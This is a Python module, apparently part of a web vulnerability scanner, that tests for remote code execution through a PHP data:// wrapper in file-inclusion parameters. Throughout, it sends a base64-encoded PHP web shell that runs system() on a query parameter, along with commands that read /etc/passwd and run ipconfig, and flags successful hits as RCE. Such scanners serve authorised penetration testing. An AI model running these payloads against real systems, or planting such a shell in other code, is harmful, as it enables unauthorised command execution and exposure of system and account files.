"""Test Data"""
import urllib.parse as urlparse
from urllib.parse import urlparse, parse_qs

from src.utils.arguments import init_args
from src.configs import config
from src.utils.encodings import encode
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.utils.colors import Colors


def test_data(url, post):
    """Test Data"""
    args  = init_args()
    if args['verbose']:
        print(Colors().blue("[i]") + " Testing with data wrapper...", flush = True)

    tests = []

    # Testing the URL parameter, payload and then &cmd is added
    if args['param'] in url:
        tests.append(
            "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20%2Fetc%2Fpasswd"
        )
        tests.append(
            "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig"
        )

        for _, test in enumerate(tests):
            u, reqHeaders, postTest = prepareRequest(args['param'], test, url, post)
            _, br = REQUEST(u, reqHeaders, postTest, config.proxies, "RCE", "DATA")

            if not br:
                return
            
        return

    urls = []

    # Logic to see if another URL parameter exists
    # based on that append ?/& and exploit code
    if len(parse_qs(urlparse(url).query)) == 0:
        urls.append("?c=cat%20%2Fetc%2Fpasswd")
        urls.append("?c=ipconfig")
    else:
        urls.append("&c=cat%20%2Fetc%2Fpasswd")
        urls.append("&c=ipconfig")

    test = (
        "data%3A%2F%2Ftext%2Fplain%3Bbase64%2CPD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K"
    )

    for _, url_item in enumerate(urls):
        url, reqHeaders, postTest = prepareRequest(args['param'], test, url, post)
        _, br = REQUEST(
            url + encode(url_item),
            reqHeaders,
            postTest,
            config.proxies,
            "RCE",
            "DATA",
        )
        if not br:
            break

    return
